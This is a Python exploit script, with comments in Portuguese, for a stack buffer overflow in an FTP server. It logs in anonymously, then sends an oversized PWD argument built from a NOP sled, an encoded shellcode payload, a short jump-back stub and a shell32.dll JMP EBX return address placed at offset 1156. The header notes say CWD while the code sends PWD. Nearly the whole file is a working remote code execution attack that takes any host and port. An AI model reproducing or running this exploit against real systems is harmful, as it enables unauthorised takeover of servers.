#!/usr/bin/python

"""
CRASH: 1300 bytes com o comando CWD
EIP: 6D42356D
PATTERN OFFSET : 6D42356D -> [*] Exact match at offset 1156
JMP EBX = 7CB1E88F -> shell32.dll
SHELLCODE: 40 bytes
Usar instrucoes assemb. para pegar mais espaco
Voltar 50 bytes:
>>> hex(50)
'0x32'
Instrucoes:
>> sub ebx,32
>> JMP EBX
"""

import socket
import sys
import time

def check_arguments():
	if len(sys.argv) != 3:
		print("Missing arguments")
		print("Example: " + sys.argv[0] + " [host-ip] [port]")
		print("Usage: " + sys.argv[0] + " 192.168.0.2 21")
		exit()


def sleep_two_seconds():
	time.sleep(2)


def assemble_commands():
	jmp = "\x83\xeb\x32" * 8
	jmp += "\xff\xe3"

	return jmp


def connect():
	"""
	1156 bytes to crash
	EBP: 40 bytes
	"""
	buf = ""
	buf += "\xd9\xe9\xd9\x74\x24\xf4\xb8\xea\xc4\x9d\xa8\x5a\x2b"
	buf += "\xc9\xb1\x52\x31\x42\x17\x03\x42\x17\x83\x28\xc0\x7f"
	buf += "\x5d\x50\x21\xfd\x9e\xa8\xb2\x62\x16\x4d\x83\xa2\x4c"
	buf += "\x06\xb4\x12\x06\x4a\x39\xd8\x4a\x7e\xca\xac\x42\x71"
	buf += "\x7b\x1a\xb5\xbc\x7c\x37\x85\xdf\xfe\x4a\xda\x3f\x3e"
	buf += "\x85\x2f\x3e\x07\xf8\xc2\x12\xd0\x76\x70\x82\x55\xc2"
	buf += "\x49\x29\x25\xc2\xc9\xce\xfe\xe5\xf8\x41\x74\xbc\xda"
	buf += "\x60\x59\xb4\x52\x7a\xbe\xf1\x2d\xf1\x74\x8d\xaf\xd3"
	buf += "\x44\x6e\x03\x1a\x69\x9d\x5d\x5b\x4e\x7e\x28\x95\xac"
	buf += "\x03\x2b\x62\xce\xdf\xbe\x70\x68\xab\x19\x5c\x88\x78"
	buf += "\xff\x17\x86\x35\x8b\x7f\x8b\xc8\x58\xf4\xb7\x41\x5f"
	buf += "\xda\x31\x11\x44\xfe\x1a\xc1\xe5\xa7\xc6\xa4\x1a\xb7"
	buf += "\xa8\x19\xbf\xbc\x45\x4d\xb2\x9f\x01\xa2\xff\x1f\xd2"
	buf += "\xac\x88\x6c\xe0\x73\x23\xfa\x48\xfb\xed\xfd\xaf\xd6"
	buf += "\x4a\x91\x51\xd9\xaa\xb8\x95\x8d\xfa\xd2\x3c\xae\x90"
	buf += "\x22\xc0\x7b\x36\x72\x6e\xd4\xf7\x22\xce\x84\x9f\x28"
	buf += "\xc1\xfb\x80\x53\x0b\x94\x2b\xae\xdc\x5b\x03\xb0\x7b"
	buf += "\x34\x56\xb0\x82\x7f\xdf\x56\xee\x6f\xb6\xc1\x87\x16"
	buf += "\x93\x99\x36\xd6\x09\xe4\x79\x5c\xbe\x19\x37\x95\xcb"
	buf += "\x09\xa0\x55\x86\x73\x67\x69\x3c\x1b\xeb\xf8\xdb\xdb"
	buf += "\x62\xe1\x73\x8c\x23\xd7\x8d\x58\xde\x4e\x24\x7e\x23"
	buf += "\x16\x0f\x3a\xf8\xeb\x8e\xc3\x8d\x50\xb5\xd3\x4b\x58"
	buf += "\xf1\x87\x03\x0f\xaf\x71\xe2\xf9\x01\x2b\xbc\x56\xc8"
	buf += "\xbb\x39\x95\xcb\xbd\x45\xf0\xbd\x21\xf7\xad\xfb\x5e"
	buf += "\x38\x3a\x0c\x27\x24\xda\xf3\xf2\xec\xea\xb9\x5e\x44"
	buf += "\x63\x64\x0b\xd4\xee\x97\xe6\x1b\x17\x14\x02\xe4\xec"
	buf += "\x04\x67\xe1\xa9\x82\x94\x9b\xa2\x66\x9a\x08\xc2\xa2"

	buff = "\x90" * ((1156 - 40) - len(buf)) + buf + "B" * (40 - len(assemble_commands())) + assemble_commands() +  "\x8f\xe8\xb1\x7c"

	sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sck.connect((host, port))

	sleep_two_seconds()
	
	banner = sck.recv(4096)

	sck.send("USER anonymous\r\n")
	banner = sck.recv(4096)

	sck.send("PASS anonymous\r\n")
	banner = sck.recv(4096)

	sleep_two_seconds()

	sck.send("PWD " + buff + "\r\n")
	sleep_two_seconds()

def main():
	check_arguments()

	global host
	global port

	host = sys.argv[1]
	port = int(sys.argv[2])

	connect()


main()